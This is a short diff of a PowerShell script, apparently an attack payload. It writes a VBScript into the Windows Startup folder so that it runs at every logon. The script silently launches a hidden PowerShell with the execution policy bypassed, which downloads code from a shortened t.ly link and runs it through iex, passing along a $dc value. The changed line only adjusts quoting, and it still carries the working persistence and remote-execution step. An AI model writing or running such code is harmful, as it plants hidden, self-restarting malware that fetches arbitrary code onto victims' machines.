@@ -4,7 +4,7 @@ Add-type -AssemblyName System.Drawing
 $pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\init.txt"
 $mkFile = "Set WshShell = WScript.CreateObject(`"WScript.Shell`")"
 $mkFile | Out-File -FilePath $pth -Force
-$mkFile = "WshShell.Run `"powershell.exe -NoP -Ep Bypass -W H -C `$dc=`"$dc`"; irm https://t.ly/o4SrC | iex`", 0, True"
+$mkFile = "WshShell.Run `"powershell.exe -NoP -Ep Bypass -W H -C `$dc=`'$dc`'; irm https://t.ly/o4SrC | iex`", 0, True"
 $mkFile | Out-File -FilePath $pth -Append -Force
 Rename-Item -Path $pth -NewName "init.vbs" -Force
 
